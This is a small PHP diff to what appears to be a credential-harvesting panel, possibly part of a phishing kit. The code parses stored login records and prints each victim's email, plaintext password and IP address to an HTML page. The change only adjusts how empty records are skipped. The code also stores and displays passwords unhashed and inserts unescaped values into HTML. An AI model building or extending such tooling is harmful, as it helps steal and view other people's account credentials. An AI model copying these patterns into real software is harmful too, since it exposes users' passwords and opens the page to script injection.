@@ -15,11 +15,11 @@ if (empty($logins)) {
 
 $logins = explode("\n\n", $logins);
 foreach ($logins as $login) {
-    if (empty($login)) {
-        continue;
-    }
     $email = explode("\n", $login)[0];
     $pass = explode("\n", $login)[1];
+    if (empty($email) || empty($pass)) {
+        continue;
+    }
     $client_ip = explode("\n", $login)[2];
     $page .= "<b>New User Login - IP: $client_ip</b><br>";
     $page .= "Email: $email<br>Password: $pass<br>";
